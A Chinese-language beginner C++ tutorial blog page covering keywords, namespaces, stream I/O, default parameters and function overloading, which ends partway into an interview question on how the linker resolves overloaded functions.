<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>一篇文章带你了解C&#43;&#43;入门语法 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">一篇文章带你了解C&#43;&#43;入门语法</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    
                        
                    
                    <p></p>
<div class="toc">
 <h3>文章目录</h3>
 <ul><li>
<ul><li>
<ul><li>
<ul>
<li><a href="#CC98_1">C++关键字（C++98)</a></li>
<li><a href="#_20">命名空间</a></li>
<li>
<ul>
<li><a href="#_24">命名空间定义</a></li>
<li><a href="#_73">命名空间的使用</a></li>
</ul>
     </li>
<li><a href="#C_115">C++输入与输出</a></li>
<li><a href="#_173">缺省参数</a></li>
<li>
<ul>
<li><a href="#_175">缺省参数的概念</a></li>
<li><a href="#_196">缺省参数的分类</a></li>
</ul>
     </li>
<li><a href="#_265">函数重载</a></li>
<li>
<ul><li><a href="#_269">函数重载的概念</a></li></ul>
     </li>
<li><a href="#_359">面试题</a></li>
<li>
<ul>
<li><a href="#1CCC_361">1.为什么C++支持函数重载，而C语言不支持函数重载呢？C++底层又是如何支持重载的？</a></li>
<li><a href="#externC_414">extern"C“的作用是什么？</a></li>
</ul>
     </li>
<li><a href="#_418">**引用**</a></li>
<li>
<ul>
<li><a href="#_420">引用概念</a></li>
<li><a href="#_450">引用特性</a></li>
<li><a href="#_490">常引用</a></li>
<li><a href="#_524">使用场景</a></li>
<li><a href="#_612">值和引用的作为返回值类型的性能比较</a></li>
<li><a href="#_657">引用和指针的区别</a></li>
</ul>
     </li>
<li><a href="#_715">内联函数</a></li>
<li>
<ul>
<li><a href="#_717">内联函数的概念</a></li>
<li><a href="#_742">内联函数的特性</a></li>
<li><a href="#_778">面试题</a></li>
</ul>
     </li>
<li><a href="#autoC11_794">auto关键字（C++11）</a></li>
<li>
<ul>
<li><a href="#auto_796">auto简介</a></li>
<li><a href="#auto_832">auto的使用细则</a></li>
<li><a href="#auto_881">auto不能推导的场景</a></li>
</ul>
     </li>
<li><a href="#forC11_908">基于范围的for循环（C++11）</a></li>
<li>
<ul>
<li><a href="#for_910">范围for的用法</a></li>
<li><a href="#for_952">范围for的使用条件</a></li>
</ul>
     </li>
<li><a href="#nullptrC11_974">指针空值nullptr（C++11）</a></li>
<li>
<ul>
<li><a href="#C98_976">C++98中的指针空值</a></li>
<li><a href="#C11_1036">C++11中的指针空值</a></li>
</ul>
    </li>
</ul>
   </li></ul>
  </li></ul>
 </li></ul>
</div>
<p></p> 
<h4>
<a id="CC98_1"></a>C++关键字（C++98)</h4> 
<blockquote> 
 <p>C++总共63个关键字，C语言一共32个关键字</p> 
 <p>下面我们通过表格一起来看一下C++的关键字吧</p> 
</blockquote> 
<table>
<thead><tr>
<th>asm</th>
<th>do</th>
<th>if</th>
<th>return</th>
<th>try</th>
<th>continue</th>
</tr></thead>
<tbody>
<tr>
<td>auto</td>
<td>double</td>
<td>inline</td>
<td>short</td>
<td>typedef</td>
<td>for</td>
</tr>
<tr>
<td>bool</td>
<td>dynamic_cast</td>
<td>int</td>
<td>signed</td>
<td>typeid</td>
<td>public</td>
</tr>
<tr>
<td>break</td>
<td>else</td>
<td>long</td>
<td>sizeof</td>
<td>typename</td>
<td>throw</td>
</tr>
<tr>
<td>case</td>
<td>enum</td>
<td>mutable</td>
<td>static</td>
<td>union</td>
<td>wchar_t</td>
</tr>
<tr>
<td>catch</td>
<td>explicit</td>
<td>namespace</td>
<td>static_cast</td>
<td>unsigned</td>
<td>default</td>
</tr>
<tr>
<td>char</td>
<td>export</td>
<td>new</td>
<td>struct</td>
<td>using</td>
<td>friend</td>
</tr>
<tr>
<td>class</td>
<td>extern</td>
<td>operator</td>
<td>switch</td>
<td>virtual</td>
<td>register</td>
</tr>
<tr>
<td>const</td>
<td>false</td>
<td>private</td>
<td>template</td>
<td>void</td>
<td>true</td>
</tr>
<tr>
<td>const_cast</td>
<td>float</td>
<td>protected</td>
<td>this</td>
<td>volatile</td>
<td>while</td>
</tr>
<tr>
<td>delete</td>
<td>goto</td>
<td>reinterpret_cast</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h4>
<a id="_20"></a>命名空间</h4> 
<blockquote> 
 <p>在C/C++中，变量、函数和后面要学到的类都是大量存在的，这些变量、函数和类的名称都存在于全局作用域中，可能会导致很多冲突。使用命名空间的目的是对标识符的名称进行本地化，以避免命名冲突或名字污染，namespace关键字的出现就是针对这种问题的。</p> 
</blockquote> 
<h5>
<a id="_24"></a>命名空间定义</h5> 
<blockquote> 
 <p>定义命名空间，需要使用到namespace关键字，后面跟命名空间的名字，然后接一对{}即可，{}中即为命名空间的成员。</p> 
</blockquote> 
<pre><code class="prism language-c"><span class="token comment">//定义了一个叫mlf的命名空间--域</span>
namespace mlf
<span class="token punctuation">{<!-- --></span>
   <span class="token comment">//1.命名空间中可以定义变量/函数/类型</span>
	<span class="token keyword">int</span> rand <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">return</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">struct</span> <span class="token class-name">Node</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">struct</span> <span class="token class-name">Node</span><span class="token operator">*</span> next<span class="token punctuation">;</span>
		<span class="token keyword">int</span> val<span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>命名空间也可以嵌套使用</p> 
</blockquote> 
<pre><code class="prism language-c"><span class="token comment">//2.命名空间可以嵌套</span>
namespace mlf
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a<span class="token punctuation">;</span>
	<span class="token keyword">int</span> b<span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">return</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	namespace lf
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">int</span> c<span class="token punctuation">;</span>
		<span class="token keyword">int</span> d<span class="token punctuation">;</span>
		<span class="token keyword">int</span> <span class="token function">Sub</span><span class="token punctuation">(</span><span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span>
		<span class="token punctuation">{<!-- --></span>
			<span class="token keyword">return</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>注意：<strong>一个命名空间就定义了一个新的作用域，命名空间中的所有内容都局限于该命名空间中。</strong></p> 
</blockquote> 
<h5>
<a id="_73"></a>命名空间的使用</h5> 
<blockquote> 
 <p>在学习如何使用命名空间之前，我们首先来想一个问题：**为什么C++会有命名空间这个东西，命名空间是用来干什么的呢？**1、我们自己定义的变量、函数可能跟库里面重名冲突。 2、进入公司项目组以后，做的项目通常比较大。多人协作，两个同事写的代码，命名冲突。C语言没有办法很好的解决这个问题，因此CPP提出一个新语法——命名空间。</p> 
</blockquote> 
<p><strong>C++库的实现定义在一个叫std的命名空间中</strong></p> 
<p>命名空间的使用有以下三种方式：</p> 
<p>1.指定命名空间——这是最规范也是最标准的</p> 
<pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"hello world!"</span> <span class="token operator">&lt;&lt;</span> std<span class="token operator">::</span>endl<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>2.把常用的给展开</p> 
<pre><code class="prism language-C">//把常用的展开
using std::cout;
using std::endl;
int main()
{
	cout &lt;&lt; "hello world!" &lt;&lt; endl;
	return 0;
}
</code></pre> 
<p>3.把std命名空间全部展开，直接使用。虽然方便但是容易引起命名冲突。平时写代码的时候可以这么写，但是以后写项目或者写工程的时候就不要这么写，得按第一种方式去写。</p> 
<pre><code class="prism language-c">using namespace std<span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"hello world!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h4>
<a id="C_115"></a>C++输入与输出</h4> 
<blockquote> 
 <p>我们都知道C语言的输入与输出分别是printf与scanf，那么C++里面输入与输出是什么呢？在C++里面是使用cout标准输出(控制台)和cin标准输入(键盘)。在使用他们的时候必须得包含头文件以及std标准命名空间。<strong>注：下面的endl是换行的意思相当于printf("n");</strong></p> 
</blockquote> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>
using namespace std<span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hello World!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>总结：总的来说使用C++输入输出更加方便，不需要增加数据格式控制，比如：整型%d，字符%c。但是在结构体的输出的时候printf会更加方便，总而言之，觉得哪个方便就用哪个。</p> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>
using namespace std<span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">//&lt;&lt;流插入</span>
	<span class="token comment">//它和printf都可以用，哪个方便就用哪个</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"hello world"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str <span class="token operator">=</span> <span class="token string">"hello lf"</span><span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> str <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

	<span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token keyword">double</span> d <span class="token operator">=</span> <span class="token number">1.11</span><span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> d <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d %.2lfn"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">struct</span> <span class="token class-name">Student</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> age<span class="token punctuation">;</span>
		 <span class="token comment">//...</span>
	<span class="token punctuation">}</span><span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">Student</span> s <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token string">"凌峰"</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	<span class="token comment">//cpp</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"姓名:"</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>name <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"年龄:"</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>age <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

	<span class="token comment">//c</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"姓名:%sn年龄:%dn"</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span>name<span class="token punctuation">,</span> s<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">//&gt;&gt;流提取运算符</span>
	cin <span class="token operator">&gt;&gt;</span> s<span class="token punctuation">.</span>name <span class="token operator">&gt;&gt;</span> s<span class="token punctuation">.</span>age<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"姓名:"</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>name <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"年龄:"</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>age <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

	<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s%d"</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"姓名:%sn年龄:%dn"</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span>name<span class="token punctuation">,</span> s<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h4>
<a id="_173"></a>缺省参数</h4> 
<h5>
<a id="_175"></a>缺省参数的概念</h5> 
<blockquote> 
 <p>缺省参数是声明或定义函数时为函数的参数指定的一个默认值。在调用该函数时，如果没有指定实参则采用该默认值，否则使用指定的实参。</p> 
</blockquote> 
<pre><code class="prism language-c"><span class="token comment">//缺省参数</span>
<span class="token comment">//相当于是为函数参数指定的一个默认值</span>
<span class="token keyword">void</span> <span class="token function">Func</span><span class="token punctuation">(</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">Func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//没有传参时，使用参数的默认值</span>
	<span class="token function">Func</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//传参时。使用指定的实参</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h5>
<a id="_196"></a>缺省参数的分类</h5> 
<blockquote> 
 <p>缺省参数有两种——一种是全缺省参数，一种是半缺省参数。下面我们就来介绍一下这两种缺省参数吧。</p> 
</blockquote> 
<p>1.全缺省参数</p> 
<pre><code class="prism language-c"><span class="token comment">//全缺省</span>
<span class="token keyword">void</span> <span class="token function">Func</span><span class="token punctuation">(</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"a = "</span> <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"b = "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"c = "</span> <span class="token operator">&lt;&lt;</span> c <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">Func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/d2/94/gaRCWHKQ_o.png" alt="在这里插入图片描述"></p> 
<p>2.半缺省参数</p> 
<pre><code class="prism language-c"><span class="token comment">//半缺省 -- 缺省部分参数 --必须从右往左缺省，必须连续缺省</span>
<span class="token keyword">void</span> <span class="token function">Func</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"a = "</span> <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"b = "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"c = "</span> <span class="token operator">&lt;&lt;</span> c <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">Func</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">Func</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/12/0d/7zc23QN1_o.png" alt="在这里插入图片描述"></p> 
<p>注意：</p> 
<p>1.半缺省参数必须从右往左依次来给出，不能间隔着给</p> 
<p>2.缺省参数不能在函数声明和定义中同时出现</p> 
<pre><code class="prism language-C">//a.h
void func(int a = 10);

//a.c
void func(int a = 20)
{

}
//注意：如果声明和定义位置同时出现，恰巧两个位置提供的值不同，那么编译器就无法确定到底改用哪个缺省值。
</code></pre> 
<p>3.缺省值必须是常量或者全局变量</p> 
<p>4.C语言不支持缺省参数（编译器不支持）</p> 
<h4>
<a id="_265"></a>函数重载</h4> 
<blockquote> 
 <p>自然语言中，一个词可以有多重含义，人们可以通过上下文来判断该词真实的含义，即该词被重载了。比如：一起有一个笑话，我国有两个体育项目大家根本不用看，也不用担心。一个是乒乓球，一个是男足。前者是“谁也赢不了！”，后者是“谁也赢不了！”</p> 
</blockquote> 
<h5>
<a id="_269"></a>函数重载的概念</h5> 
<blockquote> 
 <p>函数重载：是函数的一种特殊情况，C++允许在同一作用域中声明几个功能类似的同名函数，**这些同名函数的形参列表（参数个数或类型或者顺序）必须不同，**常用来处理实现功能类似数据类型不同的问题。</p> 
</blockquote> 
<pre><code class="prism language-c"><span class="token comment">//函数重载(首先得函数名相同，其次函数参数的个数，函数参数的类型，参数顺序不同只要满足其一就能够构成函数重载</span>
<span class="token comment">//与函数返回值类型无关</span>
<span class="token comment">//1.函数参数的类型不同</span>
<span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"int Add(int left,int right)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token keyword">return</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">double</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">double</span> left<span class="token punctuation">,</span> <span class="token keyword">double</span> right<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"double Add(double left,double right)"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>
	<span class="token keyword">return</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token comment">//2.函数参数的个数不同</span>
<span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"f()"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"f(int a)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token comment">//3.函数参数的顺序不同</span>
<span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">char</span> b<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"f(int a,char b)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">char</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"f(char b,int a)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">2.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">f</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">f</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/4d/5d/XIdxCEIR_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>总的来说：<strong>函数要想构成函数重载，首先函数名必须得相同，其次其次函数参数的个数，函数参数的类型，参数顺序不同只要满足其一就能够构成函数重载，与函数返回值类型无关。</strong></p> 
</blockquote> 
<p>注意：<strong>有些情况下虽然构成了函数重载，但是调用的时候会产生歧义</strong></p> 
<pre><code class="prism language-c"><span class="token comment">//构成重载，但是使用时会有问题 ： f(); // 调用存在歧义</span>
<span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"f()"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"f(int a)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	 <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用存在歧义</span>
	 <span class="token function">f</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/ec/88/5oce6r3V_o.png" alt="在这里插入图片描述"></p> 
<h4>
<a id="_359"></a>面试题</h4> 
<h5>
<a id="1CCC_361"></a>1.为什么C++支持函数重载，而C语言不支持函数重载呢？C++底层又是如何支持重载的？</h5> 
<blockquote> 
 <p>函数重载的原理用VS不方便展示，接下来我会用Linux来为大家展示。</p> 
 <p>我们首先创建了func.h、func.c、test.c这三个文件</p> 
 <p><img src="https://images2.imgbox.com/d2/d9/7wlSElfC_o.png" alt="在这里插入图片描述"></p> 
</blockquote> 
<blockquote> 
 <p><strong>在C/C++中，一个程序要运行起来，需要经历以下几个阶段：预处理、编译、汇编、链接。</strong></p> 
 <p>在正式开讲之前，我们先简单回顾一下编译器编译这个程序的过程</p> 
 <p>func.h func.c test.c</p> 
 <p>//1.预处理-&gt;头文件展开、宏替换、条件编译、去掉注释</p> 
 <p>func.i、test.i</p> 
 <p>//2.编译-&gt;检查语法，生成汇编代码</p> 
 <p>func.s、test.s</p> 
 <p>//3.汇编-&gt;汇编代码转换成二进制机器码</p> 
 <p>func.o、test.o</p> 
 <p>//<strong>4.链接</strong></p> 
 <p>a.out</p> 
 <p>**我们通过预处理编译汇编生成了fun.o与test.o的文件。需要注意的是：此时我们编译的时候是没有函数的地址的，但是为什么又能编译通过呢？这是因为我们有函数的声明，如果我们后续想要调用这个函数的话，只需要在链接的时候把函数的地址给填上就可以了。就类似于这样——你最近要结婚了打算买个房子，但是还差5w块钱，然后你给你哥们打电话说我最近打算买房子但是还差5w块钱，找他借5w块钱，然后你哥们说没问题，这个时候基本上就是稳了。这就相当于声明，因为你哥们还没把那5万块钱打过来。但当你听到支付宝到账5w元这个时候就当于函数有了它的地址，你也就可以去交首付买房了。**当编译器看到test.o调用f函数的时候，发现没有f函数的地址，就会去func.o的符号表里面去找，然后链接到一起。链接的时候，对于f函数，链接器是怎么去找的呢？解下来我们就来详细说一下。</p> 
</blockquote> 
